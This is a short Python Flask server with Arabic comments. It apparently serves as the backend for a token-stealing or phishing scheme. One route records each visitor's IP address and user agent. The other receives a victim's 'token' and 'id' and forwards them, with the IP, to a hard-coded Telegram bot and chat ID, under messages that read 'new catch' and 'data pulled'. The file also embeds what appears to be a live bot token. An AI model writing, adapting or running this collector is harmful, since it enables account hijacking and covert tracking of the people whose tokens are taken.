from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# بياناتك اللي أرسلتها
TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
CHAT_ID = "5811700860"

@app.route('/trace_visit')
def trace():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    msg = f"🔔 **صيد جديد!**\n\n🌐 IP: `{user_ip}`\n📱 الجهاز: `{user_agent}`"
    
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    
    return "ok"

@app.route('/log', methods=['POST'])
def log_data():
    data = request.json
    v_token = data.get('token')
    v_id = data.get('id')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    msg = f"🎯 **تم سحب البيانات!**\n\n🌐 IP: `{user_ip}`\n🔑 Token: `{v_token}`\n🆔 ID: `{v_id}`"
    
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    
    return jsonify({"status": "ok"})
